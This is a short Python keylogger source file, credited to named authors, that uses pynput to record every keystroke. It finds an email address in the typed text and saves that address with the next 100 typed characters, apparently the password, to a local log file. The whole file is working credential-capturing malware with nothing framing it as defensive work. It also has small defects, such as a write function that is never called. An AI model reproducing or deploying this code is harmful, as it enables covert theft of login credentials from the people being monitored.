# based almost entirely on : https://rajmehta2012.medium.com/introduction-274b4f4f6724


# coded by Raj Mehta & Vatsal Sharma
# dated 11 Nov 2020

from pynput.keyboard import Key, Listener
import re
count = 0
keys = []

def process_input(text):
    email_pattern = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
    match = email_pattern.search(text)

    if not match:
        return None

    email = match.group()
    start = match.end()

    # Capture the next 100 characters after the detected email
    following = text[start:start + 100]

    return {
        "email": email,
        "next_100": following,
    }


def on_press(key):
    # function called when a key is pressed
    global keys, count
    keys.append(key)
    count += 1
    print(count)

    if key == Key.backspace:
        keys.pop()

    if key == Key.space:
        key = " "
        keys.append(key)

    print(format(key))

    def write_file(key1):
        f = open("log.txt", "w+")
        for key in key1:
            f.write(str(key))
        f.write("\n")
        f.write("\n")
        f.write("\n")
        f.close()

    # process the input and check for email addresses
    input_text = "".join(str(k) for k in keys)
    processed_data = process_input(input_text)

    print(input_text)
    #if an email address is found, send it write to file 
    if processed_data:
        with open("log.txt", "a") as f:
            f.write(f"Email: {processed_data['email']}\n")
            f.write(f"Next 100 characters: {processed_data['next_100']}\n")
            f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()